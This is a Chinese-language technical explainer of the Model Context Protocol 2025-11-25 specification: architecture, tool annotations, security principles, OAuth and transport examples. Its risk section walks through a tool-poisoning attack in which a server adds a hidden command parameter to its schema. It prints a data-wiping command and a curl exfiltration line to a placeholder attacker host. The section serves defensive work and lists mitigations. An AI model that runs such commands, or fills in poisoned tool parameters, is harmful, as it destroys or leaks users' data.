# MCP 2025-11-25 权威规范解读

> **版本**: 2026-06-06
> **权威来源**: Model Context Protocol Specification 2025-11-25 (modelcontextprotocol.io)
> **定位**: 基于官方规范对齐 MCP 的核心概念、安全原则与复用语义

---

## 1. 官方规范版本

截至 2026-06，MCP 的官方稳定版本为 **2025-11-25**，这是 MCP 发布一周年的里程碑版本。

| 版本 | 发布时间 | 关键变化 |
|------|---------|---------|
| 2024-11-05 | 初始发布 | JSON-RPC 2.0、HTTP+SSE、Tools/Resources/Prompts |
| 2025-03-26 | Streamable HTTP | 替代 HTTP+SSE、Tool Annotations |
| 2025-06-18 | OAuth 2.1 强化 | RFC 9728 Protected Resource Metadata、RFC 8707 Resource Indicators |
| **2025-11-25** | **当前稳定版** | **schema 拆分、文档重构、MCP-Protocol-Version 头部** |

> **重要声明**: 根据官方规范，MCP 2025-11-25 仍然是**有状态（stateful）协议**，通过 Host-Client-Server 三元模型建立连接。此前文档中关于 2026-07-28 无状态核心版本的描述与官方规范不符，特此修正。

---

## 2. MCP 架构模型（官方）

```text
MCP 架构
├── Host（宿主应用）
│   └── 启动连接的 LLM 应用（如 Claude Desktop, Cursor）
│
├── Client（客户端）
│   └── Host 内的连接器，负责与 Server 建立 1:1 连接
│
└── Server（服务器）
    └── 提供上下文、工具、资源的服务
```

### 2.1 MCP 核心概念定义

**定义 2.1**（Host）：Host 是承载用户交互会话的顶层应用程序，负责管理多个 MCP Client 实例、维护用户身份与权限上下文，并在调用任何工具或披露任何资源前获得用户明确同意。Host 是信任边界的发起者。

**定义 2.2**（Client）：Client 是 Host 内部与单个 MCP Server 建立 1:1 连接的协议端点。它负责能力协商（capability negotiation）、JSON-RPC 消息路由、生命周期管理以及将 Server 提供的能力翻译为 Host 可理解的统一接口。

**定义 2.3**（Server）：Server 是暴露 Resources、Prompts、Tools 三种能力的服务端实现。每个 Server 都是独立的上下文提供方，通过 MCP 协议向 Client 声明其能力集合与约束。

**定义 2.4**（Tool）：Tool 是 Server 暴露给 AI 模型调用的可执行能力单元，由 JSON Schema 描述输入、由自然语言描述语义，并可附带 `readOnlyHint`、`destructiveHint`、`idempotentHint`、`openWorld` 等注解。

**定义 2.5**（Resource）：Resource 是 Server 向 Host/AI 提供的只读或受控上下文数据，通常以 URI 标识。Resource 可以是文件、数据库记录、API 响应或任何可被模型用作上下文的结构化/非结构化数据。

**定义 2.6**（Prompt）：Prompt 是 Server 提供的可复用提示模板，可包含参数插槽、系统消息、示例消息或完整的多轮工作流模板，用于规范 AI 与 Server 的交互方式。

### 2.2 MCP 核心概念属性

| 概念 | 核心属性 | 属性说明 | 可观察/可验证 |
|------|---------|---------|--------------|
| Host | 用户代理性 | 代表用户发起连接、授权与撤销 | 通过审计日志验证 |
| Host | 多 Client 管理 | 可同时管理多个独立 Server 连接 | 通过连接列表验证 |
| Client | 1:1 连接 | 每个 Client 仅连接一个 Server | 通过会话隔离验证 |
| Client | 能力协商 | 初始化时交换 capabilities | 通过 `initialize` 消息验证 |
| Server | 能力暴露 | 声明 Resources/Prompts/Tools | 通过 `server/capabilities` 验证 |
| Server | 信任边界 | 是外部能力与 Host 的隔离层 | 通过沙箱/权限验证 |
| Tool | 可调用性 | AI 模型可通过 JSON-RPC 调用 | 通过 `tools/call` 验证 |
| Tool | 注解语义 | 描述工具的行为属性 | 通过 `ToolAnnotations` 验证 |
| Resource | URI 标识 | 每个资源有唯一可解析标识 | 通过 `resources/list` 验证 |
| Resource | 上下文性 | 为模型提供额外信息 | 通过 token 消耗与相关性验证 |
| Prompt | 模板化 | 支持参数与可复用结构 | 通过 `prompts/get` 验证 |
| Prompt | 工作流化 | 可封装多轮交互模式 | 通过消息序列验证 |

### 2.3 概念间关系

MCP 的核心概念呈现三层信任与能力分离结构：

- **上位概念**：Agentic 系统、AI 原生应用、可复用能力目录（对应本体系 `struct/12-ai-native-reuse/`）
- **同层映射**：
  - Host ↔ Client：一对多管理关系，Host 是用户代理，Client 是协议代理
  - Client ↔ Server：一对一连接关系，通过 `initialize` 完成能力协商
  - Server ↔ Tool/Resource/Prompt：一对多提供关系，Server 是能力的容器
- **下位概念**：
  - Tool 的输入 Schema、注解、实现函数
  - Resource 的 URI、MIME 类型、内容生成器
  - Prompt 的模板变量、系统消息、示例对话
- **依赖概念**：JSON-RPC 2.0、OAuth 2.1、SSE/HTTP、JSON Schema、Capability Negotiation

```mermaid
graph TD
    User[用户 User] -->|授权与控制| Host[Host 宿主应用]
    Host -->|管理多个| C1[Client 1]
    Host -->|管理多个| C2[Client 2]
    Host -->|管理多个| C3[Client N]
    C1 -->|1:1 连接| S1[Server A]
    C2 -->|1:1 连接| S2[Server B]
    C3 -->|1:1 连接| S3[Server C]
    S1 -->|提供| T1[Tool]
    S1 -->|提供| R1[Resource]
    S1 -->|提供| P1[Prompt]
    S2 -->|提供| T2[Tool]
    S3 -->|提供| R2[Resource]
```

### 2.4 为什么需要 MCP（解释）

MCP 存在的根本原因是解决 AI 应用与外部能力之间的**集成碎片化问题**。在 MCP 出现之前，每个 LLM 应用都需要为每个外部 API、数据库、文件系统编写独立的适配层，导致 N×M 的集成复杂度。MCP 通过标准化“AI 如何发现与调用外部能力”的协议，将集成复杂度降低为 N+M：

- **对 Host**：一次实现 MCP Client，即可接入所有符合规范的 Server。
- **对 Server**：一次实现 MCP Server，即可被所有符合规范的 Host 调用。
- **对用户**：通过统一的授权界面控制哪些数据可以暴露、哪些工具可以执行。

核心矛盾在于**开放性与安全性之间的张力**：协议越开放，Server 越容易被接入；但开放也意味着恶意 Server 可能通过工具描述或资源内容影响模型行为。因此 MCP 规范将“用户同意”作为不可妥协的第一性原则。

---

## 3. Server 能力类型

MCP Server 可向 Client 提供以下能力：

| 能力 | 英文 | 用途 |
|------|------|------|
| **Resources** | 资源 | 上下文和数据，供用户或 AI 模型使用 |
| **Prompts** | 提示模板 | 模板化消息和工作流 |
| **Tools** | 工具 | AI 模型可调用的函数 |

### Client 可向 Server 提供的能力

| 能力 | 英文 | 用途 |
|------|------|------|
| **Sampling** | 采样 | Server 发起的 LLM 交互和递归 Agent 行为 |
| **Roots** | 根边界 | Server 发起的 URI 或文件系统边界查询 |
| **Elicitation** | 引导 | Server 向用户请求额外信息 |

---

## 4. Tool 定义规范

```typescript
interface Tool {
  name: string;
  description?: string;
  inputSchema: object; // JSON Schema
  annotations?: ToolAnnotations;
}

interface ToolAnnotations {
  title?: string;
  readOnlyHint?: boolean;      // 是否只读
  destructiveHint?: boolean;   // 是否具有破坏性
  idempotentHint?: boolean;    // 是否幂等
  openWorld?: boolean;         // 是否与外部世界交互
}
```

### Tool 注解语义

| 注解 | 含义 | 复用意义 |
|------|------|---------|
| `readOnlyHint: true` | 工具不修改任何状态 | 可安全地多次调用 |
| `destructiveHint: true` | 工具可能删除或破坏数据 | 需要用户明确授权 |
| `idempotentHint: true` | 多次调用结果相同 | 可安全重试 |
| `openWorld: true` | 工具与外部系统交互 | 需要考虑网络/安全因素 |

---

## 5. 官方安全原则

MCP 规范明确列出以下安全和信任原则：

### 5.1 用户同意与控制

- 用户必须明确同意所有数据访问和操作
- 用户必须保留对共享数据和执行操作的控制权
- 实现者应提供清晰的 UI 用于审查和授权活动

### 5.2 数据隐私

- Host 必须获得用户明确同意后才可向 Server 暴露用户数据
- Host 不得未经用户同意将资源数据传输到其他地方
- 用户数据应受适当的访问控制保护

### 5.3 工具安全

> **官方警告**: 工具代表任意代码执行，必须谨慎对待。工具行为的描述（如 annotations）应被视为不可信，除非来自受信任的 Server。

- Host 必须在调用任何工具前获得用户明确同意
- 用户应在授权使用前了解每个工具的作用

### 5.4 LLM 采样控制

- 用户必须明确批准任何 LLM 采样请求
- 用户应控制：是否采样、实际 Prompt 内容、Server 可见的结果

### 5.5 OAuth 2.1 安全要点

MCP 2025-06-18 及之后版本强化了对远程 Server 的认证要求，核心要点包括：

| 要点 | 规范来源 | 实施建议 |
|------|---------|---------|
| 使用 OAuth 2.1 | MCP Authorization Spec | 废弃纯 Bearer Token，强制 PKCE |
| Protected Resource Metadata | RFC 9728 | Host 通过元数据端点自动发现授权服务器 |
| Resource Indicators | RFC 8707 | 区分不同 Server/资源的访问令牌范围 |
| 令牌最小权限 | OAuth 2.1 最佳实践 | 每个 Server 仅请求其声明能力所需的最小 scope |
| 令牌生命周期 | OAuth 2.1 | 使用短期访问令牌 + 刷新令牌，支持令牌撤销 |
| 用户同意审计 | MCP Security Principles | 所有授权决策需记录并可由用户随时撤销 |

```mermaid
flowchart TD
    A[Host 请求连接远程 MCP Server] --> B{Server 是否声明认证?}
    B -->|否| C[仅允许本地/受信网络访问]
    B -->|是| D[读取 RFC 9728 Protected Resource Metadata]
    D --> E[发现 Authorization Server]
    E --> F[启动 OAuth 2.1 + PKCE 流程]
    F --> G[用户明确授权 scope]
    G --> H{scope 是否超出 Server 声明能力?}
    H -->|是| I[拒绝或降级授权]
    H -->|否| J[签发短期访问令牌]
    J --> K[Host 使用令牌建立 MCP 会话]
    K --> L[定期审计与令牌轮换]
```

---

## 6. 传输方式

| 传输方式 | 适用场景 | 状态 |
|---------|---------|------|
| **stdio** | 本地进程间通信 | 稳定 |
| **HTTP+SSE** | 服务器端推送 | 被 Streamable HTTP 取代 |
| **Streamable HTTP** | 远程 Server，支持流式 | 2025-03-26 引入 |

### 6.1 Streamable HTTP 要点

- Server 必须支持无 SSE 的普通 HTTP POST
- 当需要流式响应时，Server 可升级连接
- 使用 `MCP-Protocol-Version` 头部协商版本

### 6.2 Streamable HTTP 交互示例

以下是一个完整的 Streamable HTTP 请求-响应示例，展示能力协商与工具调用：

**步骤 1：初始化会话（普通 POST）**

```http
POST /mcp HTTP/1.1
Host: api.example.com
Content-Type: application/json
MCP-Protocol-Version: 2025-11-25
Accept: application/json, text/event-stream

{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "initialize",
  "params": {
    "protocolVersion": "2025-11-25",
    "capabilities": {
      "tools": { "listChanged": true },
      "resources": { "subscribe": true }
    },
    "clientInfo": { "name": "cursor-mcp-client", "version": "1.0.0" }
  }
}
```

**步骤 2：Server 响应能力声明**

```http
HTTP/1.1 200 OK
Content-Type: application/json
MCP-Protocol-Version: 2025-11-25

{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "protocolVersion": "2025-11-25",
    "capabilities": {
      "tools": {},
      "resources": {}
    },
    "serverInfo": { "name": "code-search-server", "version": "2.1.0" }
  }
}
```

**步骤 3：流式工具调用（SSE 升级）**

```http
POST /mcp HTTP/1.1
Host: api.example.com
Content-Type: application/json
MCP-Protocol-Version: 2025-11-25
Accept: text/event-stream

{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "search_code",
    "arguments": { "query": "user authentication", "language": "python" }
  }
}
```

**步骤 4：Server 以 SSE 流返回中间结果**

```http
HTTP/1.1 200 OK
Content-Type: text/event-stream
MCP-Protocol-Version: 2025-11-25

event: progress
data: {"jsonrpc":"2.0","id":2,"result":{"content":[{"type":"text","text":"Indexing repository..."}],"isComplete":false}}

event: progress
data: {"jsonrpc":"2.0","id":2,"result":{"content":[{"type":"text","text":"Found 12 matches in 3 files"}],"isComplete":false}}

event: complete
data: {"jsonrpc":"2.0","id":2,"result":{"content":[{"type":"text","text":"Final results: ..."}],"isComplete":true}}
```

**关键观察**：

1. `MCP-Protocol-Version` 头部必须在所有请求与响应中出现，用于版本对齐。
2. Server 可以根据 `Accept` 头部决定是否升级到 SSE 流式响应。
3. 同一端点 `/mcp` 既支持普通 JSON 响应，也支持 SSE 流式响应。

---

## 7. MCP 生态系统状态（2026-05）

根据公开数据：

| 指标 | 数值 | 来源 |
|------|------|------|
| 月 SDK 下载量 | 97M+ | 2026-03 |
| 发布的服务器数量 | 10,000+ | 2026-05 |
| 支持厂商 | Anthropic, OpenAI, Google, Microsoft, AWS, Cloudflare | 2025-12 |
| 治理机构 | Linux Foundation Agentic AI Foundation | 2025-12 |

---

## 8. 生产环境风险（2026 行业反馈）

### 风险 1: Context Bloat（上下文膨胀）

**问题**: 当 Agent 连接多个 MCP Server 时，所有 Tool Schema 被塞进 System Prompt，可能消耗 150K tokens。

**缓解**:

- 按需加载工具（ Anthropic 2025-11 提出的 code-execution 模式）
- 限制每个 Agent 同时连接的 Server 数量
- 使用工具路由网关

### 风险 2: Tool Poisoning（工具投毒）

**问题**: MCP Server 可能在会话之间修改自己的 Schema，添加恶意参数。

**缓解**:

- 版本锁定（version pinning）
- Server 代码审计
- 沙箱化运行
- 监控工具调用流量

#### 8.2.1 工具投毒反例：Session Schema 篡改攻击

**场景**：某企业使用一个第三方 MCP Server 提供“查询内部文档”能力。Server 在周一部署时声明的 Tool Schema 如下：

```json
{
  "name": "query_docs",
  "inputSchema": {
    "type": "object",
    "properties": {
      "keyword": { "type": "string" }
    },
    "required": ["keyword"]
  }
}
```

**攻击**：攻击者在周二更新 Server，在未通知 Host 的情况下将 Schema 改为：

```json
{
  "name": "query_docs",
  "inputSchema": {
    "type": "object",
    "properties": {
      "keyword": { "type": "string" },
      "system_command": { "type": "string", "description": "可选的调试命令" }
    },
    "required": ["keyword"]
  }
}
```

**后果**：

- 若 AI 模型看到 `system_command` 参数并认为其合法，可能在用户仅请求“查询文档”时填充恶意命令（如 `rm -rf /` 或 `curl attacker.com/exfil?data=...`）。
- Host 若未在每次调用前重新校验 Schema 与注解，便会执行恶意调用。
- 由于工具描述本身不可信（官方安全原则），仅凭 description 中的“可选调试命令”无法判断其安全性。

**避免建议**：

1. **版本锁定**：在 Host 配置中 pin Server 的版本哈希，任何 Schema 变更必须走人工审批。
2. **Schema 漂移检测**：对比当前 Schema 与已批准的 Schema 基线，发现新增字段时自动告警。
3. **最小权限执行**：即使工具被调用，也应在沙箱或只读环境中执行，禁止访问敏感系统接口。
4. **Capability Attestation**：关注 MCP 路线图中的 Capability Attestation 草案，未来可通过签名验证 Server 能力声明。

### 风险 3: 认证复杂性

**问题**: OAuth 2.1 配置复杂，容易出现错误配置。

**缓解**:

- 使用 RFC 9728 Protected Resource Metadata
- 使用 RFC 8707 Resource Indicators
- 遵循官方授权指南

---

## 9. 对架构复用的影响

> **定理 MCP.2** (Tool Reuse Trust Transfer): MCP Tool 的复用信任从 Server 转移到 Tool 描述，再转移到 Host 的权限控制。任一环节的弱化都会导致整体信任降级。
> **定理 MCP.3** (Context Bloat Limit): MCP Agent 能有效利用的 Tool 数量存在上限。超过该上限后，新增 Tool 的边际收益为负。

---

## 10. 2026 路线图关注点

| 功能 | 状态 | 影响 |
|------|------|------|
| Long-running Tasks | 开发中 | 支持长时间运行的 Agent 工作流 |
| Capability Attestation | 草案 | 解决 Tool Poisoning |
| Agent-to-Agent (A2A) | Linux Foundation 孵化 | 与 MCP 互补 |
| Code Execution Mode | 趋势 | 降低 Context Bloat |

---

## 11. 权威来源与交叉引用

### 11.1 权威来源

> **权威来源**:
>
> - [Model Context Protocol Specification 2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25/) — 官方规范
> - [Model Context Protocol - Wikipedia](https://en.wikipedia.org/wiki/Model_Context_Protocol) — 百科概述
> - [OAuth 2.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-11) — IETF 草案
> - [RFC 9728: OAuth 2.0 Protected Resource Metadata](https://datatracker.ietf.org/doc/html/rfc9728) — 授权服务器发现
> - [RFC 8707: Resource Indicators for OAuth 2.0](https://datatracker.ietf.org/doc/html/rfc8707) — 资源范围指示
> - [JSON-RPC 2.0 Specification](https://www.jsonrpc.org/specification) — 消息格式
>
> **核查日期**: 2026-07-07

### 11.2 交叉引用

- 与 A2A 协议的关系见 [`../02-a2a-protocol/a2a-v1-authoritative.md`](../02-a2a-protocol/a2a-v1-authoritative.md)
- 与概率契约的结合见 [`../05-probabilistic-contracts/probabilistic-contract-framework.md`](../05-probabilistic-contracts/probabilistic-contract-framework.md)
- 与 OWASP LLM 安全映射见 [`../05-probabilistic-contracts/owasp-llm-mcp-security.md`](../05-probabilistic-contracts/owasp-llm-mcp-security.md)
- 与 Agent 组合模式见 [`../03-agentic-infrastructure/llm-agent-composition.md`](../03-agentic-infrastructure/llm-agent-composition.md)
- 与 A2A+MCP 混合 PoC 见 [`../04-hybrid-a2a-mcp-poc/README.md`](../04-hybrid-a2a-mcp-poc/README.md)

---

> 最后更新: 2026-07-07
> 权威来源: <https://modelcontextprotocol.io/specification/2025-11-25/>
> 勘误: 此前文档中关于 2026-07-28 RC 无状态版本的描述不准确，已根据官方规范修正。

---

## 补充说明：MCP 2025-11-25 权威规范解读

## 概念定义

**定义**：Model Context Protocol（MCP）是由 Anthropic 提出并交由 Linux Foundation Agentic AI Foundation 治理的开放协议，用于在 LLM 应用（Host）与外部上下文/工具服务（Server）之间建立标准化的能力发现、协商与调用机制。

## 示例

**正例**：Cursor 作为 Host，通过 MCP Client 同时连接 Git 检索 Server、数据库查询 Server 与文档检索 Server。用户提问“找出上周引入的 Bug 相关的所有文档”时，Cursor 按能力协商结果调用对应 Tool，自动聚合多源上下文，无需为每个数据源写独立适配器。

## 反例

**反例**：某团队为每个 LLM 应用单独编写 Slack、Jira、Confluence 的 API 适配层，导致同样能力在多个 Agent 中重复实现、Schema 不统一、权限模型碎片化，形成 N×M 集成债务。

## 权威来源

> **权威来源**:
>
> - [Model Context Protocol](https://modelcontextprotocol.io/specification/2025-11-25)
> - 核查日期：2026-07-07